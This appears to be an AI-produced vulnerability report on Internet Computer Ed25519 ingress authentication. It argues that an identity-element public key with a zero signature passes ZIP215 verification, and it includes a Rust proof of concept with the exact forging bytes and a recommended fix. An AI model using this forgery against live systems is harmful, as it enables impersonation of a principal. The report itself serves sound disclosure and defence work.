I need to trace the exact code path and verify each claim in the exploit chain.

**Step 1: Does `verify_public_key()` return `true` for the non-canonical identity encoding?**

The test at `packages/ic-ed25519/tests/tests.rs` lines 499-514 explicitly confirms: [1](#0-0) 

`deserialize_raw` succeeds and `is_torsion_free()` returns `true` for `0x0100...0080`. The identity element is in every subgroup, including the prime-order subgroup, so `is_torsion_free()` passes.

**Step 2: Is `verify_public_key()` actually called in the ingress path?**

The ingress path is: `validate_request` → `validate_request_content` → `validate_user_id_and_signature` → `validate_signature` → `validate_signature_plain` → `verify_basic_sig_by_public_key`. [2](#0-1) 

`verify_basic_sig_by_public_key` calls `ic_ed25519::PublicKey::deserialize_raw` then `pk.verify_signature` — **no `is_torsion_free()` check anywhere in this path**. [3](#0-2) 

**Step 3: Does `Signature::from_slice` accept R=identity, S=0?**

The `from_slice` implementation: [4](#0-3) 

- R = canonical identity `[0x01, 0, ..., 0]`: `CompressedEdwardsY([0x01,0,...,0]).decompress()` succeeds (identity is a valid curve point).
- S = `[0; 32]`: `Scalar::from_canonical_bytes([0;32])` succeeds (0 is a valid canonical scalar, 0 < l).

**Step 4: Does `verify_signature` pass for A=identity, R=identity, S=0?**

The verification equation: [5](#0-4) 

With A = identity:
- `minus_a = -(identity) = identity`
- `recomputed_r = S·B + k·(−A) = 0·B + k·identity = identity + identity = identity`
- `(recomputed_r − R).mul_by_cofactor() = (identity − identity).mul_by_cofactor() = identity`
- `identity.is_identity() = true` → **verification passes**

**Step 5: The ZIP215 test data confirms this directly.**

Line 226 of the ZIP215 test data: [6](#0-5) 

`pk=0100...0080` (non-canonical identity), `sig=0100...00 || 0000...00` (R=canonical identity, S=0). The `verification_follows_zip215` test asserts this verifies successfully: [7](#0-6) 

**Step 6: The `validate_user_id` check is satisfiable.** [8](#0-7) 

The attacker computes `P = SHA-224(DER(identity_key)) || 0x02` and sets `sender = P`. This check passes trivially since the attacker controls both fields.

**Step 7: The threshold sig code explicitly rejects non-canonical identities, but the ingress path does not.** [9](#0-8) 

The threshold code explicitly rejects `NON_CANONICAL_IDENTITIES`. The ingress path has no equivalent guard.

---

### Title
ZIP215 Identity-Key Zero-Signature Forgery in Ingress Authentication — (`packages/ic-ed25519/src/lib.rs`, `rs/validator/src/ingress_validation.rs`)

### Summary

An unprivileged attacker can authenticate as the principal derived from the Ed25519 identity element by submitting a zero-scalar, identity-R signature. The IC's ZIP215 verification equation passes for any public key A=identity with signature (R=identity, S=0), and the ingress validation path contains no guard rejecting the identity element as a public key.

### Finding Description

The `verify_signature` implementation in `packages/ic-ed25519/src/lib.rs` follows ZIP215 semantics with a cofactor check: `(S·B + k·(−A) − R).mul_by_cofactor().is_identity()`. When A is the identity element, `−A = identity`, `k·identity = identity`, `0·B = identity`, so `recomputed_r = identity`. With R also set to the identity, the check becomes `(identity − identity).mul_by_cofactor() = identity.is_identity() = true`, unconditionally passing.

The ingress validation path (`validate_user_id_and_signature` → `validate_signature` → `validate_signature_plain` → `verify_basic_sig_by_public_key`) calls only `deserialize_raw` (or `deserialize_rfc8410_der`) followed by `verify_signature`. Neither function checks `is_torsion_free()` or rejects the identity element. The `verify_public_key()` function that does call `is_torsion_free()` is used only for node key validation, not ingress.

The ZIP215 test data at `packages/ic-ed25519/tests/data/zip215.txt` line 226 explicitly includes the case `pk=0100...0080, sig=0100...00||0000...00` and the `verification_follows_zip215` test asserts it passes.

### Impact Explanation

An attacker can authenticate as the deterministic principal `SHA-224(DER(identity_key)) || 0x02` without possessing any private key. Any canister that grants permissions to this principal (e.g., because the attacker registered it first, or because it was used in a multi-party setup) can be accessed by anyone. The invariant "only the holder of the private key can authenticate as a given principal" is violated for this specific principal.

### Likelihood Explanation

The attack is fully local and requires no privileged access, no network attack, and no cryptographic computation beyond SHA-224. The ZIP215 test data already encodes the exact exploit case. The only constraint is that the target principal must have been granted some permission, which the attacker can arrange by registering it first.

### Recommendation

Add an explicit rejection of the identity element (and all small-order points) in the ingress public key validation path. Specifically, in `user_public_key_from_bytes` (or in `verify_basic_sig_by_public_key`), after deserializing an Ed25519 public key, call `is_torsion_free()` AND explicitly check `!pk.to_edwards().is_identity()`. Alternatively, add a check equivalent to the one in the threshold sig code: [10](#0-9) 

### Proof of Concept

```rust
use ic_ed25519::PublicKey;
use hex_literal::hex;

// Non-canonical identity encoding
let identity_pk_raw = hex!("0100000000000000000000000000000000000000000000000000000000000080");
// Canonical identity encoding as R, zero scalar as S
let zero_sig = hex!("01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000");

let pk = PublicKey::deserialize_raw(&identity_pk_raw).unwrap();
assert!(pk.is_torsion_free()); // passes — identity is torsion-free
// verify_signature passes for any message:
assert!(pk.verify_signature(b"any ingress message", &zero_sig).is_ok());
```

This is directly confirmed by the existing `verification_follows_zip215` test which asserts the ZIP215 test vector for this exact case passes. [6](#0-5) [11](#0-10)

### Citations

**File:** packages/ic-ed25519/tests/tests.rs (L499-514)
```rust
#[test]
fn public_key_accepts_but_can_detect_non_canonical_keys() {
    // The only non-canonical but torsion free points are 3 non-canonical
    // encodings of the identity element:

    const NON_CANONICAL: [[u8; 32]; 3] = [
        hex!("0100000000000000000000000000000000000000000000000000000000000080"),
        hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f"),
        hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
    ];

    for nc in &NON_CANONICAL {
        let k = PublicKey::deserialize_raw(nc).unwrap();
        assert!(k.is_torsion_free());
        assert!(!k.is_canonical());
    }
```

**File:** packages/ic-ed25519/tests/tests.rs (L562-591)
```rust
#[test]
#[cfg(feature = "rand")]
fn verification_follows_zip215() {
    let rng = &mut test_rng();

    // ZIP215 test data from https://github.com/zcash/zcash/blob/master/src/gtest/test_consensus.cpp#L119-L1298
    let zip215_str = include_str!("data/zip215.txt");

    let testcases = zip215_str
        .split('\n')
        .filter(|s| !s.is_empty())
        .map(|s| {
            s.split(':')
                .map(|s| hex::decode(s).unwrap())
                .collect::<Vec<_>>()
        })
        .map(|s| {
            (
                ic_ed25519::PublicKey::deserialize_raw(&s[0]).unwrap(),
                s[1].clone(),
            )
        })
        .collect::<Vec<_>>();

    let msg = b"Zcash";

    // Test each signature individually
    for (pk, sig) in &testcases {
        assert!(pk.verify_signature(msg, sig).is_ok());
    }
```

**File:** rs/validator/src/ingress_validation.rs (L625-632)
```rust
// Verifies that the user id matches the public key.  Returns an error if not.
fn validate_user_id(sender_pubkey: &[u8], id: &UserId) -> Result<(), RequestValidationError> {
    if id.get_ref() == &PrincipalId::new_self_authenticating(sender_pubkey) {
        Ok(())
    } else {
        Err(UserIdDoesNotMatchPublicKey(*id, sender_pubkey.to_vec()))
    }
}
```

**File:** rs/validator/src/ingress_validation.rs (L705-714)
```rust
fn validate_signature_plain(
    validator: &dyn IngressSigVerifier,
    message_id: &MessageId,
    signature: &BasicSigOf<MessageId>,
    pubkey: &UserPublicKey,
) -> Result<(), AuthenticationError> {
    validator
        .verify_basic_sig_by_public_key(signature, message_id, pubkey)
        .map_err(InvalidBasicSignature)
}
```

**File:** rs/crypto/standalone-sig-verifier/src/lib.rs (L19-44)
```rust
    match algorithm_id {
        AlgorithmId::Ed25519 => {
            let pk = ic_ed25519::PublicKey::deserialize_raw(pk_bytes).map_err(|e| {
                CryptoError::MalformedPublicKey {
                    algorithm: AlgorithmId::Ed25519,
                    key_bytes: Some(pk_bytes.to_vec()),
                    internal_error: e.to_string(),
                }
            })?;

            if sig.len() != ic_ed25519::SIGNATURE_BYTES {
                return Err(CryptoError::MalformedSignature {
                    algorithm: AlgorithmId::Ed25519,
                    sig_bytes: sig.to_vec(),
                    internal_error: "Invalid length".to_string(),
                });
            }

            pk.verify_signature(msg, sig)
                .map_err(|e| CryptoError::SignatureVerification {
                    algorithm: AlgorithmId::Ed25519,
                    public_key_bytes: pk.serialize_raw().to_vec(),
                    sig_bytes: sig.to_vec(),
                    internal_error: e.to_string(),
                })
        }
```

**File:** packages/ic-ed25519/src/lib.rs (L449-471)
```rust
    fn from_slice(signature: &[u8]) -> Result<Self, SignatureError> {
        if signature.len() != SIGNATURE_BYTES {
            return Err(SignatureError::InvalidLength);
        }

        let (r, r_bytes) = {
            let mut r_bytes = [0_u8; 32];
            r_bytes.copy_from_slice(&signature[..32]);
            let r = CompressedEdwardsY(r_bytes)
                .decompress()
                .ok_or(SignatureError::InvalidSignature)?;

            (r, r_bytes)
        };

        let s = {
            let mut s_bytes = [0_u8; 32];
            s_bytes.copy_from_slice(&signature[32..]);
            Option::<Scalar>::from(Scalar::from_canonical_bytes(s_bytes))
                .ok_or(SignatureError::InvalidSignature)?
        };

        Ok(Self { r, r_bytes, s })
```

**File:** packages/ic-ed25519/src/lib.rs (L709-727)
```rust
    pub fn verify_signature(&self, msg: &[u8], signature: &[u8]) -> Result<(), SignatureError> {
        let signature = Signature::from_slice(signature)?;

        let k = Self::compute_challenge(&signature, self, msg);
        let minus_a = -self.pk.to_edwards();
        let recomputed_r =
            EdwardsPoint::vartime_double_scalar_mul_basepoint(&k, &minus_a, signature.s());

        use curve25519_dalek::traits::IsIdentity;

        if (recomputed_r - signature.r())
            .mul_by_cofactor()
            .is_identity()
        {
            Ok(())
        } else {
            Err(SignatureError::InvalidSignature)
        }
    }
```

**File:** packages/ic-ed25519/tests/data/zip215.txt (L226-226)
```text
0100000000000000000000000000000000000000000000000000000000000080:01000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

**File:** rs/crypto/internal/crypto_lib/threshold_sig/canister_threshold_sig/src/utils/group/ed25519.rs (L279-333)
```rust
/// The non-canonical identity elements of Ed25519
///
/// Ed25519 has a set of points which are considered valid but are not
/// the canonical encoding of the point. That is, implementations should
/// never generate them, but are expected to parse them.
///
/// We expect that all peers in the protocol behave correctly and do not
/// ever produce a non-canonical point encoding. Given this, we reject
/// such points immediately.
///
/// The other non-canonical points are all not within the prime order
/// subgroup; they are either in the subgroup of size 8, or the
/// subgroup of size 8*l where l is the size of the Ed25519 prime
/// order subgroup.  These points are caught by the checks for a
/// torsion component
///
const NON_CANONICAL_IDENTITIES: [[u8; 32]; 3] = [
    hex!("0100000000000000000000000000000000000000000000000000000000000080"),
    hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff7f"),
    hex!("eeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"),
];

#[derive(Clone, Eq, PartialEq, Zeroize, ZeroizeOnDrop)]
pub struct Point {
    p: curve25519_dalek::EdwardsPoint,
}

/// Static deserialization of the fixed alternative group generator
static ED25519_GENERATOR_H: LazyLock<Point> = LazyLock::new(|| {
    Point::deserialize(&hex!(
        "d0509f80e5df2c3865f3b4cda82cc5b5c5b33f9c0ee151bbba1ad5a0f6e507db"
    ))
    .expect("The ed25519 generator_h point is invalid")
});

impl Point {
    pub const BYTES: usize = 32;

    /// Internal constructor (private)
    fn new(p: curve25519_dalek::EdwardsPoint) -> Self {
        Self { p }
    }

    /// Deserialize a point
    ///
    /// If the value encoded is not a valid point on the curve, then
    /// None is returned
    pub fn deserialize(bytes: &[u8]) -> Option<Self> {
        let b: [u8; Self::BYTES] = bytes.try_into().ok()?;

        for nci in &NON_CANONICAL_IDENTITIES {
            if bool::from(b.ct_eq(nci)) {
                return None;
            }
        }
```

**File:** rs/crypto/internal/crypto_lib/basic_sig/ed25519/src/api.rs (L97-103)
```rust
pub fn verify_public_key(pk: &types::PublicKeyBytes) -> bool {
    if let Ok(pk) = ic_ed25519::PublicKey::deserialize_raw(&pk.0) {
        pk.is_torsion_free()
    } else {
        false
    }
}
```
